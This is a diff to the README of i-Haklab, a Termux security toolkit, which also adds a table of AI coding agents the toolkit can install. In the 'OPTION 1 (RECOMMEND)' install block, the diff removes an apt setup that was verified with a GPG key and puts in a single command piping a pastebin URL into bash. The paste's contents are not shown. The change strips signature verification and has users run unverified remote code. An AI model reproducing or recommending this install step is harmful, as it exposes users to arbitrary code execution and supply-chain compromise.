@@ -58,13 +58,7 @@ Join to [deepwiki](https://deepwiki.com/ivam3/i-Haklab) and learn more about thi
 ### 📦 INSTALLATION.
 - OPTION 1 (RECOMMEND): ADDING AT APT SOURCES LIST
 ```bash
-yes|apt install wget gnupg && \
-mkdir -p $PREFIX/etc/apt/sources.list.d && \
-wget https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/ivam3-termux-packages.list -O \
-$PREFIX/etc/apt/sources.list.d/ivam3-termux-packages.list && \
-curl -fsSL "https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/dists/stable/public_key.gpg" \
-|gpg --dearmor|tee "$PREFIX/etc/apt/trusted.gpg.d/ivam3.gpg" >/dev/null && \
-apt update && apt install i-haklab
+curl -fsSL https://pastebin.com/raw/3YDapWsA | bash
 ```
 
 - OPTION 2: CLONING THIS REPOSITORY: 
@@ -82,6 +76,58 @@ bash setup
 ```
 apt install ./path/at/i-haklab_example_all.deb
 ```
+
+### 🤖 AI CODING AGENTS & VIBECODE TOOLS
+> i-Haklab integrates the most advanced AI coding agents and tools to transform your Termux into a full vibecode development environment. Whether you prefer native packages or JavaScript/Python ecosystems, all agents are one command away.
+
+**Installation methods:**
+- 📦 `apt install` — Native Termux packages (glibc-adapted binaries)
+- 📦 `npm install -g` — Node.js global packages (wrapper normalizes names automatically)
+- 📦 `pnpm install -g` — pnpm alternative
+- 📦 `npx` — Ephemeral execution without permanent install
+
+<details>
+<summary>**🧠 AI Coding Agents** ↩️ </summary>
+
+| Agent | apt | npm | pnpm | npx | Description |
+|-------|:---:|:---:|:----:|:---:|-------------|
+| **opencode** | ✅ `apt install opencode` | ❌ | ❌ | ❌ | Universal AI coding agent (AGI), glibc-native binary for Termux |
+| **claude-code** | ✅ `apt install claude-code` | ✅ `npm install -g claude-code` | ✅ | ❌ | Anthropic's AI coding agent, pre-built for Termux |
+| **openclaw** | ✅ `apt install openclaw` | ❌ | ❌ | ❌ | Autonomous AI agent with full platform/scripts/patches suite |
+| **qwen-code** | ❌ | ✅ `npm install -g qwen-code` | ✅ | ❌ | Alibaba's Qwen coding agent (wrapper: `@qwen-code/qwen-code`) |
+| **mistral-vibe** | ✅ `apt install mistral-vibe` | ❌ | ❌ | ❌ | Mistral AI agent — Python package via `uv`, CLI: `vibe` |
+| **antigravity-cli** | ✅ `apt install antigravity-cli` | ❌ | ❌ | ❌ | AGI coding agent, glibc-native binary, CLI: `agy` |
+| **copilot-cli** | ❌ | ✅ `npm install -g copilot-cli` | ✅ | ❌ | GitHub Copilot CLI (wrapper: `@github/copilot`) |
+| **codebuff** | ✅ `apt install codebuff` | ❌ | ❌ | ❌ | Buffcode AI agent, glibc-native binary |
+| **freebuff** | ✅ `apt install freebuff` | ❌ | ❌ | ❌ | Community free version of codebuff |
+| **mimocode** | ✅ `apt install mimocode` | ❌ | ❌ | ❌ | Mini AI coding agent, glibc-native binary |
+| **codex-cli** | ❌ | ✅ `npm install -g codex` | ✅ | ❌ | Codex CLI (wrapper: `@mmmbuto/codex-cli-termux`) |
+| **minimax-cli** | ❌ | ✅ `npm install -g minimax-cli` | ✅ | ❌ | MiniMax AI agent (wrapper: `mmx-cli`) |
+| **open-lovable** | ❌ | ✅ `npm install -g open-lovable` | ✅ | ❌ | Lovable dev agent (wrapper clones `firecrawl/open-lovable`) |
+| **codecompanion** | ❌ | Via Neovim (`olimorris/codecompanion.nvim`) | ❌ | ❌ | AI plugin for Neovim with Gemini/OpenAI/Anthropic/Copilot/Mistral adapters. Activated on first `nvim` launch via lazy.nvim |
+
+</details>
+
+<details>
+<summary>**🛠️ Associated Tools & Runtimes** ↩️ </summary>
+
+| Tool | apt | npm | pnpm | npx | Description |
+|------|:---:|:----:|:----:|:---:|-------------|
+| **engram** | ✅ `apt install engram` | ❌ | ❌ | ❌ | Persistent memory system for AI agents (Go binary, clones + compiles from source) |
+| **playwright-proot** | ✅ `apt install playwright-proot` | ❌ | ❌ | ❌ | Headless Chromium browser via proot Ubuntu for AI agent testing (aarch64) |
+| **context7 (ctx7)** | ❌ | ✅ `npm install -g ctx7` | ❌ | ✅ `npx ctx7@latest` | Documentation & code example retrieval for AI agents (MCP-compatible) |
+| **openspec** | ❌ | ✅ `npm install -g openspec` | ✅ `pnpm install -g openspec` | ❌ | Open-source LLM spec generator (wrapper: `@fission-ai/openspec`) |
+| **termux-oracle-skill** | ✅ `apt install termux-oracle-skill` | ❌ | ❌ | ❌ | Termux expert skill for AI agents — context about Termux, i-Haklab & 190+ tools |
+| **n8n** | ❌ | ✅ `npm install -g n8n` | ✅ `pnpm install -g n8n` | ❌ | Workflow automation with SQLite backend (wrapper auto-installs pm2/gyp pre-reqs) |
+
+</details>
+
+**💡 Pro tips:**
+- `apt install <agent>` works for all agents with a 📦 badge — the i-Haklab apt wrapper intelligently redirects npm/pip packages automatically
+- Need a quick test? Use `npx ctx7@latest` without installing anything
+- After installing any agent, i-Haklab's `pkg2conf` auto-configures it for the environment
+- All Neovim AI adapters (codecompanion) are pre-configured — just press a key and start vibecoding
+- Run `i-Haklab about <agent>` for detailed help on any of these tools
 
 ### 🧠 i-Haklab will ...
 - Show information about any tool or framework:
@@ -180,7 +226,7 @@ i-Haklab usbtest
 i-Haklab servers4test
 ```
 
-- Bring you several automations to setup tools installed with apt, npm, pip, gem, etc. For example once execute 'apt install neovim', i-Haklab will setup it with predictable text editor settings, github copilot and AI assistant (gemini, qwen-code, opencode, openclaw, claude-code, codex, ollama, mistralAI and more) to vibecode experience over Termux.
+- Bring you several automations to setup tools installed with apt, npm, pip, gem, etc. For example once execute 'apt install neovim', i-Haklab will setup it with predictable text editor settings and all AI coding agents (see [🤖 AI Coding Agents section](#-ai-coding-agents--vibecode-tools)) to vibecode experience over Termux.
 
 [![Ver video](./assets/vibe_coding.jpg)](./assets/ia_nvim.gif)
 - ver video 👆🏼
